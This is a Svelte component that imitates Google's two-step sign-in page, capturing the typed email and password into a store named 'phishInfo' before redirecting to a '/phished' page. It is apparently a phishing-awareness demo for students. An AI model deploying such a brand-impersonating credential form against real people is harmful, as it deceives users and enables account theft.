<script lang="ts">
	import { goto } from '$app/navigation';
	import { tick } from 'svelte';
	import url from './google.jpg';
	import { fade, fly } from 'svelte/transition';
	import { phishInfo } from '$lib/stores';

	let state: 'email' | 'password' | 'phished' = 'email';

	let email: string | null = null;
	let emailElement: HTMLInputElement | null = null;
	let passwordElement: HTMLInputElement | null = null;
	let emailName: string = 'Student';

	let password: string | null = null;

	$: {
		if (email) {
			emailName = email.split('@').at(0) ?? 'Student';
		}
	}

	async function stateToPassword() {
		email = emailElement?.value ?? null;
		state = 'password';
		await tick();
		passwordElement?.focus();
	}

	function stateToPhished() {
		password = passwordElement?.value ?? null;
		state = 'phished';
		if (!email || !password) return;
		$phishInfo = { email, password };
		goto('/phished');
	}
</script>

<div class="verify">
	{#key state}
		<div
			class="content"
			in:fly={{ x: 200, duration: 500, delay: 500 }}
			out:fly={{ x: -200, duration: 500 }}
		>
			<img src={url} alt="Google logo" />
			{#if state == 'email'}
				<div class="title">
					<h1>Sign in</h1>
					<p>Use your Google Account</p>
				</div>

				<div class="inputs">
					<input
						type="text"
						placeholder="Email or phone"
						bind:this={emailElement}
						on:keydown={(e) => {
							if (e.key == 'Enter') {
								stateToPassword();
							}
						}}
					/>
					<a href="./">Forgot email?</a>
				</div>

				<p class="guestmode">
					Not your computer? Use Guest mode to sign in privately.
					<a href="./">Learn more</a>
				</p>

				<div class="buttons">
					<button class="weak">Create account</button>
					<button on:click={stateToPassword}>Next</button>
				</div>
			{:else if state == 'password'}
				<div class="title">
					<h1>Hi {emailName}</h1>
					<div class="pocket">
						<div class="profile" />
						<div>
							{email}
						</div>
					</div>
				</div>

				<div class="inputs">
					<input
						bind:this={passwordElement}
						type="password"
						placeholder="Enter your password"
						on:keydown={(e) => {
							if (e.key == 'Enter') {
								stateToPhished();
							}
						}}
					/>
					<label>
						<input type="checkbox" /> Show password
					</label>
				</div>

				<div class="buttons">
					<button class="weak">Forgot password?</button>
					<button on:click={stateToPhished}>Next</button>
				</div>
			{/if}
		</div>
	{/key}
</div>

<style>
	@import '@fontsource/noto-sans';

	.verify {
		max-width: 500px;
		--border: #dadee3;
		--button: rgb(26, 115, 232);
		--button-hover: rgb(24, 104, 200);
		--link: rgb(26, 115, 232);
		--link-hover: rgb(24, 104, 200);
		--button-weak-hover: rgb(240, 245, 255);
		--text-weak: #4d5054;
		background: white;
		border: 1px solid var(--border);
		border-radius: 8px;
		width: 400px;
		height: 500px;
		position: relative;

		overflow: hidden;
	}

	.content {
		box-sizing: border-box;
		padding: 48px 40px 80px;

		width: 100%;
		height: auto;
		display: flex;
		gap: 20px;
		flex-direction: column;
		align-items: center;
		justify-content: center;
		position: absolute;
	}
	@media (max-width: 500px) {
		.verify {
			width: 100%;
			height: 100%;
		}
		.content {
			position: relative;
			padding: 10px;
		}
	}

	img {
		width: 90px;
	}

	h1 {
		font-size: 24px;
		font-weight: 400;
		margin: 0;
	}
	.title {
		display: flex;
		flex-direction: column;
		align-items: center;
		justify-content: center;
		gap: 5px;
		padding-bottom: 15px;
	}
	.title p {
		font-size: 16px;
		margin: 0;
	}

	input[type='text'],
	input[type='password'] {
		font-size: 16px;
		width: 100%;
		padding: 13px 15px;
		border-radius: 4px;
		border: 1px solid var(--border);
		box-sizing: border-box;
		line-height: 1.7;
		font-weight: 400;
	}
	input[type='text']::placeholder,
	input[type='password']::placeholder {
		color: var(--text-weak);
	}
	input[type='text']:focus,
	input[type='password']:focus {
		outline: none;
		border: 1px solid var(--button);
		box-shadow: 0 0 0 1px var(--button);
	}

	/* set checkbox background to blue */
	input[type='checkbox'] {
		-webkit-appearance: none;
		-moz-appearance: none;
		appearance: none;
		outline: none;
		width: 18px;
		height: 18px;
		border-radius: 2px;
		border: 2px solid var(--text-weak);
		background: white;
		cursor: pointer;
		margin: 0;
		position: relative;
	}

	label {
		display: flex;
		flex-direction: row;
		align-items: center;
		gap: 20px;
		color: var(--text-weak);
		font-size: 14px;
	}
	/* set checkbox background to blue when checked */
	input[type='checkbox']:checked {
		background: var(--button);
		border: 1px solid var(--button);
	}
	input[type='checkbox']:checked::after {
		content: '✓';
		color: white;
		font-size: 16px;
		position: absolute;
		top: 0px;
		left: 3px;
	}
	.inputs {
		display: flex;
		flex-direction: column;
		gap: 5px;
		width: 100%;
	}
	.guestmode {
		font-size: 14px;
		color: var(--text-weak);
	}
	.pocket {
		display: flex;
		flex-direction: row;
		align-items: center;
		border: 1px solid var(--border);
		border-radius: 100px;
		padding: 3px 5px 3px 3px;
		font-size: 14px;
		gap: 5px;
	}
	.profile {
		width: 18px;
		height: 18px;
		border-radius: 100px;
		background: var(--button-weak-hover);
		border: 1px solid var(--border);
	}

	a {
		text-decoration: none;
		color: var(--link);
		font-size: 14px;
		font-weight: bold;
	}

	a:visted {
		color: var(--link);
	}

	.buttons {
		display: flex;
		flex-direction: row;
		justify-content: space-between;
		width: 100%;
	}
	.buttons button {
		font-size: 14px;
		padding: 10px 25px;
		border-radius: 4px;
		border: none;
		background: var(--button);
		color: white;
		cursor: pointer;
	}
	.buttons button:hover {
		background: var(--button-hover);
	}

	.buttons button.weak {
		padding: 10px 10px;

		background: white;
		border: none;
		color: var(--link);
		transform: translateX(-10px);
	}

	.buttons button.weak:hover {
		background: var(--button-weak-hover);
		color: var(--link-hover);
	}
</style>
